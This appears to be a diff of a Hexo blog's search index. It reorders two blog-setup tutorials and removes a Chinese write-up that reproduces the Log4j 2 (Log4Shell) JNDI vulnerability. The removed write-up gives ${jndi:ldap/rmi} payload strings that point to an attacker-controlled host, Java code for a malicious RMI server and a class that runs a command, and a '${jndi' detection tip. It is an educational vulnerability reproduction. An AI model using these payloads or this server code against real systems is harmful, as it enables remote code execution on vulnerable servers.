@@ -1,102 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>hexo+github搭建个人博客</title>
-    <url>/2021/11/09/hexo-github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>有那么多的博客平台，为什么要搭建个人博客？</p>
-<blockquote>
-<ul>
-<li>基于共享平台的策略会审核发布内容并可能随时被删</li>
-<li>你是否想搭建专属的个性化博客，定义自己的精美页面</li>
-<li>作为一个编程从业者，有一个专门记录自己成长的博客可以作为求职的一个技能栈介绍</li>
-</ul>
-</blockquote>
-<p>本系列教程将搭建一个这样的博客<a href="https://hackt0.github.io">Hackt0’s Blog预览</a>(博客还在完善中)<br><a href="https://hackt0.github.io/2021/11/09/hexo-github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2">原文链接</a></p>
-<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><blockquote>
-<ul>
-<li>github账号</li>
-<li>node.js 、git</li>
-</ul>
-</blockquote>
-<h3 id="本文环境"><a href="#本文环境" class="headerlink" title="本文环境"></a>本文环境</h3><blockquote>
-<ul>
-<li>Window11/Windows10 x64</li>
-<li>node.js v16.11.1(使用最新版本运行hexo server 是会出现告警，但是不影响使用，如果介意，可以使用低版本)</li>
-<li>Git v2.33.1 </li>
-<li>hexo v5.4.0</li>
-</ul>
-</blockquote>
-<h2 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="创建github仓库"><a href="#创建github仓库" class="headerlink" title="创建github仓库"></a>创建github仓库</h3><blockquote>
-<p>首先在<a href="https://github.com/">gitHub官网</a>注册一个账号(<strong>注册的用户名会和之后的博客域名相关，可以直接想好，避免二次修改</strong>)，由于github在外网，可能出现无法访问的情况，可以参考<a href="https://hackt0.github.io/2021/11/09/解决github访问失败/">解决 github 访问失败 | Hackt0’s Blog</a></p>
-<p>注册完成后会收到一份邮件，要点击完成下注册验证</p>
-<p>以新建账号为例做介绍，创建一个仓库</p>
-<p><img src="https://i.loli.net/2021/11/09/U2tXyYQisGm5Par.png" alt="create repository.png"></p>
-<p>Repository name一栏填上<code>用户名.github.io</code>，如上图用户名为shuhan520，那么对应的Repository name就是<code>shuhan520.github.io</code>，再勾选一下<code>Add a README file</code>选项用于快速生成项目页面，其余选项全部默认即可</p>
-<p>创建后可以在Settings-Pages看到自己的专属域名了（<del>不推荐使用projectpage，如果使用其他名称生成的域名会带有路径，搭建博客时会出现路径导致的资源访问问题</del>），此时访问网页是刚刚创建的README文档内容，没有勾选Add a README file选项的需要添加内容才可以生成</p>
-<p><img src="https://i.loli.net/2021/11/09/TanQNDwvzWgpsU4.png" alt="GithubPages.png"></p>
-<p>上图Custom domain可以绑定其他域名</p>
-</blockquote>
-<h3 id="配置SSH-Key"><a href="#配置SSH-Key" class="headerlink" title="配置SSH Key"></a>配置SSH Key</h3><blockquote>
-<p>可以使用<a href="https://git-scm.com/downloads">Git官网</a>下载和安装git，安装完成后鼠标右键空白处菜单栏会出现<code>git bash here</code>选项，设置个人邮箱和用户名</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&quot;你的GitHub用户名&quot;</span></span><br><span class="line">$ git config --global user.email <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure>
-<p>生成ssh-key文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure>
-<p>生成过程中需要设置生成路径、密码，默认空白即可；注意使用默认路径时是否存在提示already exists，如果有可以输入’n’退出，重设路径或者使用现有ssh-key(邮箱相同时)</p>
-<p>找到生成的.ssh的文件夹中的id_rsa.pub，记事本打开复制全部内容即可</p>
-<p>可以在<a href="https://github.com/settings/keys">SSH and GPG keys (github.com)</a>点击New SSH Key，title为任意内容，key输入刚刚复制的key文件内容，点击Add SSH Key即可</p>
-<p>打开cmd命令行窗口输入</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh git@github.com</span><br></pre></td></tr></table></figure>
-<p>看到以下内容即可(初次访问可能需要添加GitHub域名到可信域名，确认连接时输入yes即可)</p>
-<blockquote>
-<p>PTY allocation request failed on channel 0<br>Hi shuhan520! You’ve successfully authenticated, but GitHub does not provide shell access.<br>Connection to github.com closed.</p>
-</blockquote>
-</blockquote>
-<h3 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h3><blockquote>
-<p>可以使用<a href="https://nodejs.org/zh-cn/download/">node.js官网</a>下载和安装node.js，打开控制台输入以下命令可正常输出版本号即安装完成</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ node -v</span><br><span class="line">$ npm -v</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>至此所有的准备工作已经完成</p>
-<h2 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h2><h3 id="框架选取"><a href="#框架选取" class="headerlink" title="框架选取"></a>框架选取</h3><p>快速构建博客可以选择<code>hexo，hugo，wordpress</code>等框架，本文使用的时hexo，因为静态页面搭建相对简单，检索时发现hexo拥有很多美化主题和美化教程，同时自动根据markdown文档识别文章列表、分类、标签、翻页等动态内容，相对于小白比较容易上手</p>
-<blockquote>
-<p> <a href="http://hexo.io/">hexo官网</a><br> <a href="https://github.com/hexojs/hexo">hexo github</a></p>
-</blockquote>
-<h3 id="hexo安装"><a href="#hexo安装" class="headerlink" title="hexo安装"></a>hexo安装</h3><p>新建一个单独的目录用于搭建博客，在新建目录下打开cmd命令行输入以下命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo</span><br></pre></td></tr></table></figure>
-<p>安装完成后输入以下命令初始化</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure>
-<p>hexo会自动下载相关文件到本地，此时可以通过以下命令开启本地预览</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure>
-<p>打开浏览器访问 <a href="http://localhost:4000/">http://localhost:4000</a>即可看到未发布的页面效果(本地访问可以使用浏览器隐私模式，避免因缓存而导致修改效果无法正常显示)</p>
-<p>如果提示端口占用可以使用以下命令更改端口</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server -p 5000 <span class="comment">#更改端口到5000</span></span><br></pre></td></tr></table></figure>
-<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h4><p>修改hexo根目录下的<code>_config.yml</code>中的<code>language</code>，默认是en，主题支持三种语言</p>
-<ul>
-<li>default(en)</li>
-<li>zh-CN (简体中文)</li>
-<li>zh-TW (繁体中文)</li>
-</ul>
-<h4 id="站点配置"><a href="#站点配置" class="headerlink" title="站点配置"></a>站点配置</h4><p>修改hexo根目录下的<code>_config.yml</code>中的<code>Site</code>和<code>URL</code>部分</p>
-<h3 id="推送到Github"><a href="#推送到Github" class="headerlink" title="推送到Github"></a>推送到Github</h3><p>安装github插件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
-<p>修改hexo主目录下的站点配置文件<code>_config.yml</code>，修改最下方deploy为如下内容，yml以缩进表示层级关系，所以务必要使用空格对齐<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">   <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">   <span class="attr">repo:</span> <span class="string">git@github.com:`your</span> <span class="string">username`/`your</span> <span class="string">username`.github.io.git</span></span><br><span class="line">   <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure><br>推送到github仓库：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo d</span><br></pre></td></tr></table></figure>
-<p>如果推送时提示</p>
-<blockquote>
-<p>nothing to commit, working tree clean</p>
-</blockquote>
-<p>请清除本地缓存，重新生成后推送：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean &amp;&amp; hexo g</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure></p>
-<p>至此，可以使用github分配的个人域名访问到博客了</p>
-<p>个人使用记录，仅供参考，如果配置过程中遇到的问题可以在评论区留言</p>
-<p>更多美化和使用教程将在下期推出</p>
-]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>blog</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hexo个人博客美化</title>
     <url>/2021/12/12/hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/</url>
     <content><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>博客页面总不好看所以没心情记录？本站同款美化教程来了！</p>
@@ -245,6 +149,102 @@
         </tr>
     </tbody>
 </table>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>blog</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo+github搭建个人博客</title>
+    <url>/2021/11/09/hexo-github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>有那么多的博客平台，为什么要搭建个人博客？</p>
+<blockquote>
+<ul>
+<li>基于共享平台的策略会审核发布内容并可能随时被删</li>
+<li>你是否想搭建专属的个性化博客，定义自己的精美页面</li>
+<li>作为一个编程从业者，有一个专门记录自己成长的博客可以作为求职的一个技能栈介绍</li>
+</ul>
+</blockquote>
+<p>本系列教程将搭建一个这样的博客<a href="https://hackt0.github.io">Hackt0’s Blog预览</a>(博客还在完善中)<br><a href="https://hackt0.github.io/2021/11/09/hexo-github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2">原文链接</a></p>
+<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><blockquote>
+<ul>
+<li>github账号</li>
+<li>node.js 、git</li>
+</ul>
+</blockquote>
+<h3 id="本文环境"><a href="#本文环境" class="headerlink" title="本文环境"></a>本文环境</h3><blockquote>
+<ul>
+<li>Window11/Windows10 x64</li>
+<li>node.js v16.11.1(使用最新版本运行hexo server 是会出现告警，但是不影响使用，如果介意，可以使用低版本)</li>
+<li>Git v2.33.1 </li>
+<li>hexo v5.4.0</li>
+</ul>
+</blockquote>
+<h2 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="创建github仓库"><a href="#创建github仓库" class="headerlink" title="创建github仓库"></a>创建github仓库</h3><blockquote>
+<p>首先在<a href="https://github.com/">gitHub官网</a>注册一个账号(<strong>注册的用户名会和之后的博客域名相关，可以直接想好，避免二次修改</strong>)，由于github在外网，可能出现无法访问的情况，可以参考<a href="https://hackt0.github.io/2021/11/09/解决github访问失败/">解决 github 访问失败 | Hackt0’s Blog</a></p>
+<p>注册完成后会收到一份邮件，要点击完成下注册验证</p>
+<p>以新建账号为例做介绍，创建一个仓库</p>
+<p><img src="https://i.loli.net/2021/11/09/U2tXyYQisGm5Par.png" alt="create repository.png"></p>
+<p>Repository name一栏填上<code>用户名.github.io</code>，如上图用户名为shuhan520，那么对应的Repository name就是<code>shuhan520.github.io</code>，再勾选一下<code>Add a README file</code>选项用于快速生成项目页面，其余选项全部默认即可</p>
+<p>创建后可以在Settings-Pages看到自己的专属域名了（<del>不推荐使用projectpage，如果使用其他名称生成的域名会带有路径，搭建博客时会出现路径导致的资源访问问题</del>），此时访问网页是刚刚创建的README文档内容，没有勾选Add a README file选项的需要添加内容才可以生成</p>
+<p><img src="https://i.loli.net/2021/11/09/TanQNDwvzWgpsU4.png" alt="GithubPages.png"></p>
+<p>上图Custom domain可以绑定其他域名</p>
+</blockquote>
+<h3 id="配置SSH-Key"><a href="#配置SSH-Key" class="headerlink" title="配置SSH Key"></a>配置SSH Key</h3><blockquote>
+<p>可以使用<a href="https://git-scm.com/downloads">Git官网</a>下载和安装git，安装完成后鼠标右键空白处菜单栏会出现<code>git bash here</code>选项，设置个人邮箱和用户名</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&quot;你的GitHub用户名&quot;</span></span><br><span class="line">$ git config --global user.email <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure>
+<p>生成ssh-key文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure>
+<p>生成过程中需要设置生成路径、密码，默认空白即可；注意使用默认路径时是否存在提示already exists，如果有可以输入’n’退出，重设路径或者使用现有ssh-key(邮箱相同时)</p>
+<p>找到生成的.ssh的文件夹中的id_rsa.pub，记事本打开复制全部内容即可</p>
+<p>可以在<a href="https://github.com/settings/keys">SSH and GPG keys (github.com)</a>点击New SSH Key，title为任意内容，key输入刚刚复制的key文件内容，点击Add SSH Key即可</p>
+<p>打开cmd命令行窗口输入</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh git@github.com</span><br></pre></td></tr></table></figure>
+<p>看到以下内容即可(初次访问可能需要添加GitHub域名到可信域名，确认连接时输入yes即可)</p>
+<blockquote>
+<p>PTY allocation request failed on channel 0<br>Hi shuhan520! You’ve successfully authenticated, but GitHub does not provide shell access.<br>Connection to github.com closed.</p>
+</blockquote>
+</blockquote>
+<h3 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h3><blockquote>
+<p>可以使用<a href="https://nodejs.org/zh-cn/download/">node.js官网</a>下载和安装node.js，打开控制台输入以下命令可正常输出版本号即安装完成</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ node -v</span><br><span class="line">$ npm -v</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>至此所有的准备工作已经完成</p>
+<h2 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h2><h3 id="框架选取"><a href="#框架选取" class="headerlink" title="框架选取"></a>框架选取</h3><p>快速构建博客可以选择<code>hexo，hugo，wordpress</code>等框架，本文使用的时hexo，因为静态页面搭建相对简单，检索时发现hexo拥有很多美化主题和美化教程，同时自动根据markdown文档识别文章列表、分类、标签、翻页等动态内容，相对于小白比较容易上手</p>
+<blockquote>
+<p> <a href="http://hexo.io/">hexo官网</a><br> <a href="https://github.com/hexojs/hexo">hexo github</a></p>
+</blockquote>
+<h3 id="hexo安装"><a href="#hexo安装" class="headerlink" title="hexo安装"></a>hexo安装</h3><p>新建一个单独的目录用于搭建博客，在新建目录下打开cmd命令行输入以下命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo</span><br></pre></td></tr></table></figure>
+<p>安装完成后输入以下命令初始化</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure>
+<p>hexo会自动下载相关文件到本地，此时可以通过以下命令开启本地预览</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure>
+<p>打开浏览器访问 <a href="http://localhost:4000/">http://localhost:4000</a>即可看到未发布的页面效果(本地访问可以使用浏览器隐私模式，避免因缓存而导致修改效果无法正常显示)</p>
+<p>如果提示端口占用可以使用以下命令更改端口</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server -p 5000 <span class="comment">#更改端口到5000</span></span><br></pre></td></tr></table></figure>
+<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h4><p>修改hexo根目录下的<code>_config.yml</code>中的<code>language</code>，默认是en，主题支持三种语言</p>
+<ul>
+<li>default(en)</li>
+<li>zh-CN (简体中文)</li>
+<li>zh-TW (繁体中文)</li>
+</ul>
+<h4 id="站点配置"><a href="#站点配置" class="headerlink" title="站点配置"></a>站点配置</h4><p>修改hexo根目录下的<code>_config.yml</code>中的<code>Site</code>和<code>URL</code>部分</p>
+<h3 id="推送到Github"><a href="#推送到Github" class="headerlink" title="推送到Github"></a>推送到Github</h3><p>安装github插件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
+<p>修改hexo主目录下的站点配置文件<code>_config.yml</code>，修改最下方deploy为如下内容，yml以缩进表示层级关系，所以务必要使用空格对齐<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">   <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">   <span class="attr">repo:</span> <span class="string">git@github.com:`your</span> <span class="string">username`/`your</span> <span class="string">username`.github.io.git</span></span><br><span class="line">   <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure><br>推送到github仓库：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo d</span><br></pre></td></tr></table></figure>
+<p>如果推送时提示</p>
+<blockquote>
+<p>nothing to commit, working tree clean</p>
+</blockquote>
+<p>请清除本地缓存，重新生成后推送：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean &amp;&amp; hexo g</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure></p>
+<p>至此，可以使用github分配的个人域名访问到博客了</p>
+<p>个人使用记录，仅供参考，如果配置过程中遇到的问题可以在评论区留言</p>
+<p>更多美化和使用教程将在下期推出</p>
 ]]></content>
       <categories>
         <category>hexo</category>
@@ -476,50 +476,6 @@
       </categories>
       <tags>
         <tag>Textual Criticism</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>log4j 2漏洞原理及复现</title>
-    <url>/2021/12/13/%E6%A0%B8%E5%BC%B9%E7%BA%A7!log4j%202%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>被log4j2漏洞刷频了，公司也是紧急修复了一波，现在来整个盘一下这个漏洞到底是什么原理！测试漏洞的人太多，连dnslog很长一段时间都访问不了，最后还用的ceye测试复现的。</p>
-<div class="tabs" id="influence"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#influence-1">影响版本</button></li><li class="tab"><button type="button" data-href="#influence-2">影响范围</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="influence-1"><p><strong>Apache Log4j 2.x&lt;=2.15.0.rc1</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="influence-2"><p>Spring-Boot-strater-log4j2Apache<br>Struts2Apache<br>SolrApache<br>FlinkApache<br>DruidElasticSearch<br>Flume<br>Dubbo<br>Redis<br>Logstash<br>Kafka<br>vmvare</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>最主要的漏洞成因就是下面这张图了，log4j2提供的lookup功能</p>
-<p><img src="https://s2.loli.net/2021/12/13/7C3zoiVgf1Tjq2B.jpg" alt="log4j2.jpg"></p>
-<p>日志中包含 <code>$&#123;&#125;</code>,lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。log4j 2将基本的解析都做了实现：<br><div class="tabs" id="lookup"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#lookup-1">实例</button></li><li class="tab"><button type="button" data-href="#lookup-2">支持类型</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="lookup-1"><p>比如常见的用户登陆日志记录</p>
-<p><img src="https://s2.loli.net/2021/12/13/FbTqPux3Ydn9SzE.png" alt="lookup.png"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="lookup-2"><blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;ctx:loginId&#125;</span><br><span class="line">$&#123;map:type&#125;</span><br><span class="line">$&#123;filename&#125;</span><br><span class="line">$&#123;date:MM-dd-yyyy&#125;</span><br><span class="line">$&#123;docker:containerId&#125;$&#123;docker:containerName&#125;</span><br><span class="line">$&#123;docker:imageName&#125;</span><br><span class="line">$&#123;env:USER&#125;</span><br><span class="line">$&#123;event:Marker&#125;</span><br><span class="line">$&#123;mdc:UserId&#125;</span><br><span class="line">$&#123;java&#125;</span><br><span class="line">$&#123;jndi:logging/context-name&#125;</span><br><span class="line">$&#123;hostName&#125;</span><br><span class="line">$&#123;docker:containerId&#125;</span><br><span class="line">$&#123;k8s&#125;</span><br><span class="line">$&#123;log4j&#125;</span><br><span class="line">$&#123;main&#125;</span><br><span class="line">$&#123;name&#125;</span><br><span class="line">$&#123;marker&#125;</span><br><span class="line">$&#123;spring&#125;</span><br><span class="line">$&#123;sys:logPath&#125;</span><br><span class="line">$&#123;web:rootDir&#125;</span><br></pre></td></tr></table></figure>
-</blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></p>
-<p>而其中的JNDI（Java Naming and Directory Interface）就是本次的主题了，就是提供一个目录系统，并将服务与对象关联起来，可以使用名称来访问对象。而log4j 2中JNDI解析未作限制，可以直接访问到远程对象，如果是自己的服务器还好说，那如果访问到黑客的服务器呢？</p>
-<p>也就是当记录日志的一部分是用户可控时，就可以构造恶意字符串使服务器记录日志时调用JNDI访问恶意对象，也就是流传出的payload构成：</p>
-<p>${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp}</p>
-<p>我们可以将上面日志记录的代码简单修改一下，假设用户名是从外部获取的用户输入，此时构建一个恶意用户名<code>$&#123;jndi:ladp://z2xcu7.dnslog.cn/exp&#125;</code>，然后触发日志记录(可以借助DNSLog生成临时域名用于查看测试是否生效）</p>
-<p><img src="https://s2.loli.net/2021/12/14/DqpwP4NmOai1YQj.png" alt="ldap.png"></p>
-<p>可以看到，记录日志时发起了JNDI解析，访问了DNS提供的域名并生成记录</p>
-<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>其实JNDI通过SPI（Service Provider Interface）封装了多个协议，包括LDAP、RMI、DNS、NIS、NDS、RMI、CORBA；</p>
-<p>复现选择了使用RMI服务，搭建较为快速</p>
-<p>攻击思路（文章中使用的jdk1.8）：</p>
-<h3 id="找到目标服务器记录日志的地方，且记录的部分内容可控"><a href="#找到目标服务器记录日志的地方，且记录的部分内容可控" class="headerlink" title="找到目标服务器记录日志的地方，且记录的部分内容可控"></a>找到目标服务器记录日志的地方，且记录的部分内容可控</h3><p>我们还是选择之前的模拟日志记录，假设站点会记录用户登陆日志，实际上大部分网站确实会做相关功能</p>
-<h3 id="搭建RMI服务端，包含需要执行的恶意代码"><a href="#搭建RMI服务端，包含需要执行的恶意代码" class="headerlink" title="搭建RMI服务端，包含需要执行的恶意代码"></a>搭建RMI服务端，包含需要执行的恶意代码</h3><p>RMI服务端搭建，监听本地8888（自定义）端口，用Reference类引用恶意对象</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">8888</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Create RMI registry on port 8888&quot;</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;server.Log4jRCE&quot;</span>, <span class="string">&quot;server.Log4jRCE&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;exp&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>恶意对象模拟执行cmd打开计算器，并且输出一个语句用于标记执行处</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Log4jRCE</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;exec in here&quot;</span>);</span><br><span class="line">            String [] cmd=&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>执行RMIServer，创建RMI服务</p>
-<h3 id="构建EXP触发目标服务器进行日志记录触发JNDI解析"><a href="#构建EXP触发目标服务器进行日志记录触发JNDI解析" class="headerlink" title="构建EXP触发目标服务器进行日志记录触发JNDI解析"></a>构建EXP触发目标服务器进行日志记录触发JNDI解析</h3><p>构建恶意用户名模拟输入，执行触发恶意解析</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String username = <span class="string">&quot;$&#123;jndi:rmi://yourip:8888/exp&#125;&quot;</span>;</span><br><span class="line">        logger.error(username + <span class="string">&quot;is login on $&#123;java:os&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码"><a href="#解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码" class="headerlink" title="解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码"></a>解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码</h3><p>恶意代码被执行，注意看恶意代码执行记录，是在日志记录的地方被执行</p>
-<p><img src="https://s2.loli.net/2021/12/14/RBLCYQ1laAiXvpD.png" alt="res.png"></p>
-<h3 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h3><p>看看大佬们都干了啥</p>
-<p><a href="https://m.weibo.cn/status/4713921489404877?wm=3333_2001&amp;from=10BC193010&amp;sourcetype=weixin">特斯拉测试</a><br><a href="https://mp.weixin.qq.com/s/tIv68iiGcXg-Fl4MQY0SGQ">主要利用模式</a></p>
-<h1 id="修复与检测"><a href="#修复与检测" class="headerlink" title="修复与检测"></a>修复与检测</h1><p>可以通过<code>$&#123;jndi</code>字串匹配是否受到攻击</p>
-<p>修复参考链接：</p>
-<p><a href="https://mp.weixin.qq.com/s/mb708YuskTyek29g-3pAEg">https://mp.weixin.qq.com/s/mb708YuskTyek29g-3pAEg</a></p>
-<p><a href="https://mp.weixin.qq.com/s/ClNpWamMn55BkholbUbo_g">https://mp.weixin.qq.com/s/ClNpWamMn55BkholbUbo_g</a></p>
